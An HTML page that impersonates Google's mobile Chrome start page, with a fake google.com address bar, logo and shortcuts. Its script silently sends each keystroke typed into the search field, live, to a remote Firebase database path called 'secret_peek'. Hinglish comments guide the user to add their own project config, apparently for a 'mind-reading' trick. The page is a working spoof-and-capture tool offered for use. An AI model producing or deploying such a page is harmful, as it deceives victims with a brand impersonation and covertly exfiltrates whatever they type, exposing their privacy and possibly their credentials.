<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>Google</title>
    
    <script src="https://www.gstatic.com/firebasejs/8.10.1/firebase-app.js"></script>
    <script src="https://www.gstatic.com/firebasejs/8.10.1/firebase-database.js"></script>
    
    <style>
        /* CSS to match Google Chrome Android Mobile UI */
        body { font-family: 'Roboto', arial, sans-serif; background-color: white; margin: 0; padding: 0; display: flex; flex-direction: column; align-items: center; overflow-x: hidden; height: 100vh; }
        
        /* Top Bar Style (Fake Tab/URL bar) */
        .top-bar { width: 100%; height: 56px; background-color: #f2f2f2; display: flex; align-items: center; justify-content: space-between; padding: 0 16px; box-sizing: border-box; border-bottom: 1px solid #dadce0; position: fixed; top: 0; z-index: 1000; }
        .top-bar .icon { width: 24px; height: 24px; color: #5f6368; }
        .top-bar .url-text { color: #202124; font-size: 16px; font-weight: 500; }

        /* Main Content Container (Center of the screen) */
        .main-content { display: flex; flex-direction: column; align-items: center; justify-content: center; flex: 1; margin-top: 56px; width: 100%; padding: 20px; box-sizing: border-box; }

        /* Google Logo (Real Colors & Style) */
        .logo-container { margin-bottom: 30px; text-align: center; }
        .logo { font-size: 65px; font-weight: bold; font-family: 'Product Sans', arial, sans-serif; letter-spacing: -2px; }
        .g1 { color: #4285F4; } .o1 { color: #EA4335; } .o2 { color: #FBBC05; } .g2 { color: #4285F4; } .l { color: #34A853; } .e { color: #EA4335; }

        /* Real Google Search Bar Style */
        .search-wrapper { width: 100%; max-width: 500px; display: flex; align-items: center; background: white; border: 1px solid #dfe1e5; box-shadow: 0 1px 6px rgba(32,33,36,0.28); border-radius: 24px; padding: 0 10px; box-sizing: border-box; }
        .search-icon { width: 20px; height: 20px; color: #9aa0a6; padding-left: 10px; }
        input[type="text"] { flex: 1; padding: 12px 15px; border: none; font-size: 16px; outline: none; background: transparent; color: #202124; }
        .mic-icon { width: 24px; height: 24px; color: #4285F4; padding-right: 10px; }

        /* Fake Recommended Shortcuts (Mummy icons) */
        .shortcuts { display: grid; grid-template-columns: repeat(4, 1fr); gap: 20px; margin-top: 40px; width: 100%; max-width: 400px; }
        .shortcut-item { display: flex; flex-direction: column; align-items: center; text-align: center; }
        .shortcut-icon { width: 48px; height: 48px; background-color: #f1f3f4; border-radius: 50%; display: flex; align-items: center; justify-content: center; color: #5f6368; font-size: 20px; }
        .shortcut-label { margin-top: 8px; font-size: 12px; color: #202124; }

    </style>
</head>
<body>

    <div class="top-bar">
        <div class="icon">🏠</div>
        <div class="url-text">google.com</div>
        <div class="icon">⋮</div>
    </div>

    <div class="main-content">
        
        <div class="logo-container">
            <div class="logo">
                <span class="g1">G</span><span class="o1">o</span><span class="o2">o</span><span class="g2">g</span><span class="l">l</span><span class="e">e</span>
            </div>
        </div>

        <div class="search-wrapper">
            <div class="search-icon">🔍</div>
            <input type="text" id="searchInput" placeholder="Search or type URL" autocomplete="off" capitalize="none">
            <div class="mic-icon">🎤</div>
        </div>

        <div class="shortcuts">
            <div class="shortcut-item">
                <div class="shortcut-icon">➕</div>
                <div class="shortcut-label">Add</div>
            </div>
            <div class="shortcut-item">
                <div class="shortcut-icon">Y</div>
                <div class="shortcut-label">YouTube</div>
            </div>
            <div class="shortcut-item">
                <div class="shortcut-icon">F</div>
                <div class="shortcut-label">Facebook</div>
            </div>
            <div class="shortcut-item">
                <div class="shortcut-icon">I</div>
                <div class="shortcut-label">Instagram</div>
            </div>
        </div>

    </div>

    <script>
        // FIXME: Apne Firebase project ka real configuration yahan paste karein
        const firebaseConfig = {
            apiKey: "AIzaSy...",
            databaseURL: "https://apka-project-default-rtdb.firebaseio.com/",
            projectId: "apka-project-id",
        };
        
        firebase.initializeApp(firebaseConfig);
        const database = firebase.database();

        // Jaise hi user type karega, real-time me data aapke notepad page par jayega
        document.getElementById('searchInput').addEventListener('input', function(e) {
            database.ref('secret_peek/').set({
                text: e.target.value
            });
        });

        // Search bar me enter dabane par ya search icon click hone par trick clear karein
        document.getElementById('searchInput').addEventListener('keypress', function (e) {
            if (e.key === 'Enter') {
                alert("Thinking Processed. Now Focus...");
                // Aap user ko real Google ya kisi fake result page par redirect bhi kar sakte hain
            }
        });
    </script>
</body>
</html>
